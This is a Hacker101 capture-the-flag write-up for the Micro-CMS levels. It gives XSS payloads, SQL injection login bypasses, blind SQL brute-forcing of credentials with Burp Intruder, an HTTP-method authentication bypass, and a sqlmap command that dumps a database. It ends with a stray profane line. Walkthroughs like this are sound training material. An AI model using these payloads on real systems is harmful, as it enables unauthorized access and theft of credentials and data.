# Hacker101 CTF

## 1. A little something to get you started

### 1.1. Flag0

#### Steps to reproduce the issue:

0. In the `html` `header` `style` find the url of an image we shouldn't be able to access. `body {background-image: url("background.png");}`
1. Copy the url of the image and paste it into the address line after the current address separated by a `/`. `http://<current-domain>/background.png` Hit enter and see what we shouldn't.

## 2. Micro-CMS v1

### 2.1. Flag0

#### Steps to reproduce the issue:
0. Create a new page and notice the url is `./page/10`
1. Since `page 1` and `page 2` are accessible through the home page try to access all the other pages from 3 to 9 until you find the one which is `Forbidden` (startus: `403`) instead of `Not Found` (startus: `404`).
2. Try to `Edit` this page by manipulating the url based on the parameters of accessible edit pages `./page/edit/<number-of-the-forbidden-page>`
3. See we can access the edit page which we shouldn't be able to do so

### 2.2. Flag1

#### Steps to reproduce the issue:
0. On the Create page `./page/create` in the `<input name='title'>` field type `<script>alert('hello');</script>`
1. Type anything in the text field for example `xss` or simpy just leave it blank.
2. Click on the Create button `<input type="submit" value="Create">`
3. Go to the `home` page (and see the alert window popping up)

### 2.3. Flag2

#### Steps to reproduce the issue:
0. Navigate to an Edit page `./page/edit/1`
1. Try to write some SQL Injection to the address bar after the url. For example: `'SELECT * FROM Users WHERE UserId = 1 OR 1=1--` or `'--`
2. Hit `enter` and see the results.

### 2.4. Flag3

#### Steps to reproduce the issue:
0. On the Home page Click on `Create a new page`
1. In the `<textarea name="body">` field  try some XSS other than `<script>`. For example: `<body onload=alert('xss');>`
2. Give any title `other xss` for instance
3. Click `Create` button
4. On the created page see the alert (or check for the flag in the browser devtools html body)

## 3. Micro-CMS v2

#### Pre requirements:
First of all you will need some kind of `intercepting proxies` like `Burp Suite` or `OWASP ZAP`

##### Setting up Burp with firefox on ubuntu:
- Download `Burp Suite Community Edition` https://portswigger.net/burp/releases/professional-community-2024-4-5?requestededition=community&requestedplatform=
- Installation

    terminal:

    1. Open the Downloads Folder:
        > cd Downloads
    2. Make sure you've got the expected file downloaded:
        > ls
    3. Make the executable:
        > chmod +x burpsuite_community_linux_v2024_4_5.sh
    4. Run it:
        > sudo ./burpsuite_community_linux_v2024_4_5.sh
    5. Go through the installation process (leave the two paths as they are if possible)
    6. Open up Burp:
        > BurpSuiteCommunity
- Setting up

    ###### Open Port
    
    1. In Burp go to the Proxy tab > click on Proxy Settings
    2. Check which port Burp is listening on. Usually `127.0.0.1.8080`.
    You can change it if this port is already in use or for any other reason.
    3. Also you can check if this port is realy listening:

        terminal:
        > sudo lsof -nP -iTCP -sTCP:LISTEN

        > sudo lsof -nP -i:5054

        Feel free to use any other method to check open ports from netstat to nmap or whatever https://phoenixnap.com/kb/linux-check-open-ports

    ###### Configure Firefox Proxy Access

    1. In firefox go to `settings`. 
    2. Search for `proxy` and find: "Network Settings: Configure Firefox Proxy Access"
    3. Click on `Settings...` and open up the "Connection Settings: Configure Proxy Access to the Internet" window
    4. Switch to the `Manual proxy configuration` Radio Button instead of `Use system proxy settings`. Here you can switch back and forth between the two options at any time later on. (An alternative option is to use FoxyProxy so you can turn on and off proxy server in two clicks but we are not gonna discuss it here)
    5. Delete the value of `SOCKS Host` if you use it for tor or something. For example port 9031. `OR` just leave it as it is. Doesn't matter.
    6. HTTP Proxy: `127.0.0.1` Port: `8080` 
    7. Tick the "Also use this proxy for HTTPS" checkbox
    8. Click `OK`
    9. See if everything is running: go to google.com for instance
    10. If not: go to `http://burp` or `127.0.0.1:8080` and click on `CA Certificate` to download the `cacert.de` file
    11. firefox `Settings`>`Certificates`>`View Certificates...`>`Authorities`>`Import`>`cacert.de`
    12. Tick the `Trust this CA...` checkboxes and click `OK` (if you wanna get rid of it later you can find it here as `PortSwigger CA` Software Security Device)
    13. Click `OK` in Certificate Manager
    14. Now `google.com` should load. Try it
    15. Now go back to `Burp`>`Proxy`>`Intercept` and click the `Intercept is off` button to turn it on.
    16. Refresh `google.com` or load any site in firefox and come back to Burp to check what you've got. Now you need to see a bunch of good stuff.

### 3.1. Flag0

#### Steps to reproduce the issue:

0. Go to the `login` page ./login
1. Turn on `Interception` in Burp
2. Type `admin'` into the `Username` field on the `login` page and hit enter
3. In `Burp`>`Action`>`Send to Repeater` the toggle message interception
4. Find out the SQL Injection you have to send as a request to get a `status: 200` back. For example you could try this: `username=admin' UNION SELECT '1234' AS password FROM admins WHERE '1'='1&password=1234` then hit the `Send` button. See you get a `status: 200`
5. Turn off `Interception` in Burp
6. On the `login` page type `admin' UNION SELECT '1234' AS password FROM admins WHERE '1'='1` into the `Username` field and `1234` to the `Password` field then hit `Log In` and thats it. Now you are logged in as an admin and can see even the `Private Page` and have all the privileges

### 3.2. Flag1

#### Steps to reproduce the issue:
##### Bypassing Authentication

0. Send a `POST` request instead of `GET` for unauthenticated access to an edit page.

terminal:
> curl -v -X POST [YOUR_URL]/page/edit/3

### 3.3. Flag2

#### Steps to reproduce the issue:

##### Interception
0. Click `Burp > Proxy > Intercept is off` to turn on Interception
1. On the `./login` page in your web browser type anything (such as: `hello` and `poo`) in the `username` and `password` fields and click `Log in`
2. Burp > Actions > `Send to Intruder`
##### Finding the LENGTH of the username
3. Intruder > Positions: change `username=hello&password=poo` to `username=hello' OR LENGTH(username)=§§#&password=poo`
4. Intruder > Payloads: Payload Set=`1`; Payload type=`Numbers`; Number range From=`1`; To=`12`; Step=`1` > `Start attack`
5. In the `Results`, `Length` will be a higher number only when the number in the `request` matches the actual `length of the username`. So we found out the `length of the username`.
##### Finding the LENGTH of the password (repeat step 3-5 with 'password' instead of 'username')
6. Intruder > Positions: change `username=hello&password=poo` to `username=hello' OR LENGTH(password)=§§#&password=poo`
7. Intruder > Payloads: Payload Set=`1`; Payload type=`Numbers`; Number range From=`1`; To=`12`; Step=`1` > `Start attack`
8. In the `Results`, `Length` will be a higher number only when the number in the `request` matches the actual `length of the password`. So we found out the `length of the password`.
##### Brute forcing the username
9. Intruder > Positions: Set as many positions `§_§` in the request payload as the `length of the username` surrounded by the following SQL injection script. For example if the `length of the username` is `3` then `username=hello' OR username LIKE '§_§§_§§_§'#&password=poo`
10. Intruder > Payloads: Payload Set=`1`; Payload type=`Brute force`; Min length=`0`; Max length=`1` > `Start attack`
11. In the `Results`, `Length` will be a higher number only when the `character` in the `request` matches the actual character of the given position in the username. You can `sort` the results by `Length` Descending order so you can find the characters more easily in the `Payload` one after another. So we found out the `username`.
##### Brute forcing the password
12. Intruder > Positions: Set as many positions `§_§` in the request payload as the `length of the password` surrounded by the following SQL injection script. For example if the `length of the password` is `5` then `username=hello' OR password LIKE '§_§§_§§_§§_§§_§'#&password=poo`
13. Intruder > Payloads: Payload Set=`1`; Payload type=`Brute force`; Min length=`0`; Max length=`1` > `Start attack`
14. In the `Results`, `Length` will be a higher number only when the `character` in the `request` matches the actual character of the given position in the password. You can `sort` the results by `Length` Descending order so you can find the characters more easily in the `Payload` one after another. So we found out the `password`.
##### Login
15. Now you can use the credentials to log in. Go to `./login` in your web browser and do so.

#### Another method worth a try

0. Catch the payload while try to log in and save it into a text file.
1. Try the following to `extract all data` from the `database` using `sqlmap`

terminal: 
> sudo sqlmap -r [YOUR_PATH_TO_TEXT_FILE] --dump

or

> sudo python sqlmap.py -r [YOUR_PATH_TO_TEXT_FILE] --dump


<h1>I am stupid as fuck --DUMB</h1>